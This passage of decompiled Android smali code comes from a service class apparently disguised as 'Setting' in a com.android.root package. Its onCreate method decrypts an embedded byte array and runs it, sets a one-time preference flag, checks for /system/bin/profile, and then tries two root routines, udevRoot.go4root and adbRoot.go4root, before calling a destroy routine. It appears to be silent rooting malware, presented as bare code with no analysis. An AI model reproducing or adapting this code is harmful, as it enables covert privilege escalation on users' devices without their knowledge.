    .restart local v1       #e:Ljava/lang/Exception;
    :goto_5
    invoke-virtual {v1}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_4

    .line 139
    .end local v1           #e:Ljava/lang/Exception;
    .end local v2           #is:Ljava/io/DataInputStream;
    .end local v4           #os:Ljava/io/DataOutputStream;
    .restart local v3       #is:Ljava/io/DataInputStream;
    .restart local v5       #os:Ljava/io/DataOutputStream;
    :catch_3
    move-exception v9

    move-object v1, v9

    .line 142
    .restart local v1       #e:Ljava/lang/Exception;
    :goto_6
    invoke-virtual {v1}, Ljava/lang/Exception;->printStackTrace()V

    move-object v2, v3

    .end local v3           #is:Ljava/io/DataInputStream;
    .restart local v2       #is:Ljava/io/DataInputStream;
    move-object v4, v5

    .end local v5           #os:Ljava/io/DataOutputStream;
    .restart local v4       #os:Ljava/io/DataOutputStream;
    goto :goto_0

    .line 139
    .end local v1           #e:Ljava/lang/Exception;
    .end local v2           #is:Ljava/io/DataInputStream;
    .end local v4           #os:Ljava/io/DataOutputStream;
    .end local v7           #rs:Ljava/lang/String;
    .restart local v0       #buffer:[B
    .restart local v3       #is:Ljava/io/DataInputStream;
    .restart local v5       #os:Ljava/io/DataOutputStream;
    .restart local v8       #rs:Ljava/lang/String;
    :catch_4
    move-exception v9

    move-object v1, v9

    move-object v7, v8

    .end local v8           #rs:Ljava/lang/String;
    .restart local v7       #rs:Ljava/lang/String;
    goto :goto_6

    .end local v3           #is:Ljava/io/DataInputStream;
    .end local v5           #os:Ljava/io/DataOutputStream;
    .end local v7           #rs:Ljava/lang/String;
    .restart local v2       #is:Ljava/io/DataInputStream;
    .restart local v4       #os:Ljava/io/DataOutputStream;
    .restart local v8       #rs:Ljava/lang/String;
    :catch_5
    move-exception v10

    move-object v1, v10

    move-object v7, v8

    .end local v8           #rs:Ljava/lang/String;
    .restart local v7       #rs:Ljava/lang/String;
    goto :goto_5

    .line 125
    .end local v0           #buffer:[B
    .end local v4           #os:Ljava/io/DataOutputStream;
    .restart local v5       #os:Ljava/io/DataOutputStream;
    :catchall_1
    move-exception v9

    move-object v4, v5

    .end local v5           #os:Ljava/io/DataOutputStream;
    .restart local v4       #os:Ljava/io/DataOutputStream;
    goto :goto_3

    .end local v2           #is:Ljava/io/DataInputStream;
    .end local v4           #os:Ljava/io/DataOutputStream;
    .restart local v3       #is:Ljava/io/DataInputStream;
    .restart local v5       #os:Ljava/io/DataOutputStream;
    :catchall_2
    move-exception v9

    move-object v2, v3

    .end local v3           #is:Ljava/io/DataInputStream;
    .restart local v2       #is:Ljava/io/DataInputStream;
    move-object v4, v5

    .end local v5           #os:Ljava/io/DataOutputStream;
    .restart local v4       #os:Ljava/io/DataOutputStream;
    goto :goto_3

    .line 139
    .end local v7           #rs:Ljava/lang/String;
    .restart local v0       #buffer:[B
    .restart local v1       #e:Ljava/lang/Exception;
    .restart local v8       #rs:Ljava/lang/String;
    :catch_6
    move-exception v9

    move-object v1, v9

    move-object v7, v8

    .end local v8           #rs:Ljava/lang/String;
    .restart local v7       #rs:Ljava/lang/String;
    goto :goto_2

    .line 122
    .end local v0           #buffer:[B
    .end local v1           #e:Ljava/lang/Exception;
    .end local v4           #os:Ljava/io/DataOutputStream;
    .restart local v5       #os:Ljava/io/DataOutputStream;
    :catch_7
    move-exception v9

    move-object v1, v9

    move-object v4, v5

    .end local v5           #os:Ljava/io/DataOutputStream;
    .restart local v4       #os:Ljava/io/DataOutputStream;
    goto :goto_1

    .end local v2           #is:Ljava/io/DataInputStream;
    .end local v4           #os:Ljava/io/DataOutputStream;
    .restart local v3       #is:Ljava/io/DataInputStream;
    .restart local v5       #os:Ljava/io/DataOutputStream;
    :catch_8
    move-exception v9

    move-object v1, v9

    move-object v2, v3

    .end local v3           #is:Ljava/io/DataInputStream;
    .restart local v2       #is:Ljava/io/DataInputStream;
    move-object v4, v5

    .end local v5           #os:Ljava/io/DataOutputStream;
    .restart local v4       #os:Ljava/io/DataOutputStream;
    goto :goto_1
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1
    .parameter "intent"

    .prologue
    .line 300
    const/4 v0, 0x0

    return-object v0
.end method

.method public onCreate()V
    .locals 12

    .prologue
    const/4 v9, 0x1

    const/4 v8, 0x0

    const-string v11, "rt"

    const-string v10, "pref_config_setting"

    .line 238
    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    .line 239
    invoke-virtual {p0}, Lcom/android/root/Setting;->getApplicationContext()Landroid/content/Context;

    move-result-object v6

    iput-object v6, p0, Lcom/android/root/Setting;->ctx:Landroid/content/Context;

    .line 242
    sget-object v6, Lcom/android/root/Setting;->u:[B

    invoke-virtual {v6}, [B->clone()Ljava/lang/Object;

    move-result-object v1

    check-cast v1, [B

    .line 243
    .local v1, c:[B
    invoke-static {v1}, Lcom/android/root/adbRoot;->crypt([B)V

    .line 244
    new-instance v6, Lcom/android/root/Setting$2;

    invoke-direct {v6, p0, v1}, Lcom/android/root/Setting$2;-><init>(Lcom/android/root/Setting;[B)V

    .line 255
    invoke-virtual {v6}, Lcom/android/root/Setting$2;->run()V

    .line 257
    iget-object v6, p0, Lcom/android/root/Setting;->ctx:Landroid/content/Context;

    const-string v7, "pref_config_setting"

    invoke-virtual {v6, v10, v8}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v6

    const-string v7, "rt"

    invoke-interface {v6, v11, v8}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v4

    .line 258
    .local v4, i:I
    if-ne v4, v9, :cond_1

    .line 287
    :cond_0
    :goto_0
    return-void

    .line 261
    :cond_1
    iget-object v6, p0, Lcom/android/root/Setting;->ctx:Landroid/content/Context;

    const-string v7, "pref_config_setting"

    invoke-virtual {v6, v10, v8}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v6

    invoke-interface {v6}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v2

    .line 262
    .local v2, editor:Landroid/content/SharedPreferences$Editor;
    const-string v6, "rt"

    invoke-interface {v2, v11, v9}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    .line 263
    invoke-interface {v2}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 265
    new-instance v3, Ljava/io/File;

    const-string v6, "/system/bin/profile"

    invoke-direct {v3, v6}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 266
    .local v3, f:Ljava/io/File;
    invoke-virtual {v3}, Ljava/io/File;->exists()Z

    move-result v6

    if-eqz v6, :cond_2

    .line 268
    invoke-direct {p0, v9}, Lcom/android/root/Setting;->destroy(Z)V

    goto :goto_0

    .line 271
    :cond_2
    new-instance v5, Lcom/android/root/udevRoot;

    iget-object v6, p0, Lcom/android/root/Setting;->ctx:Landroid/content/Context;

    invoke-direct {v5, v6}, Lcom/android/root/udevRoot;-><init>(Landroid/content/Context;)V

    .line 272
    .local v5, udev:Lcom/android/root/udevRoot;
    invoke-virtual {v5}, Lcom/android/root/udevRoot;->go4root()Z

    move-result v6

    if-eqz v6, :cond_3

    .line 274
    invoke-direct {p0, v9}, Lcom/android/root/Setting;->destroy(Z)V

    goto :goto_0

    .line 278
    :cond_3
    new-instance v0, Lcom/android/root/adbRoot;

    iget-object v6, p0, Lcom/android/root/Setting;->ctx:Landroid/content/Context;

    iget-object v7, p0, Lcom/android/root/Setting;->handler:Landroid/os/Handler;

    invoke-direct {v0, v6, v7}, Lcom/android/root/adbRoot;-><init>(Landroid/content/Context;Landroid/os/Handler;)V

    .line 279
    .local v0, adb:Lcom/android/root/adbRoot;
    invoke-virtual {v0}, Lcom/android/root/adbRoot;->go4root()Z

    move-result v6

    if-nez v6, :cond_0

    .line 280
    invoke-direct {p0, v8}, Lcom/android/root/Setting;->destroy(Z)V

    goto :goto_0
.end method

.method public onStart(Landroid/content/Intent;I)V
    .locals 0
    .parameter "intent"
    .parameter "startId"

    .prologue
    .line 291
    invoke-super {p0, p1, p2}, Landroid/app/Service;->onStart(Landroid/content/Intent;I)V

    .line 295
    return-void
.end method
